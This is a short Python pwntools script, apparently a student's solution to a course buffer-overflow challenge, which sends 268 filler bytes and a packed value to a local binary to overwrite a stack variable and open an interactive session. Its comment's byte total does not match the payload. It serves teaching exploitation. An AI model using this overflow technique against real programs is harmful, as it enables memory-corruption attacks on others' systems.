'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_00
File Description:  Simple buffer overflow
'''

# Libraries to include
from pwn import *

# Payload to send
payload=b'a'*268+p32(0x69420)       #276 bytes total, local var to overwhite at var_4, rest at var_110

# sending process
p=process("./a.out")
p.sendline(payload)
p.recv()
p.interactive()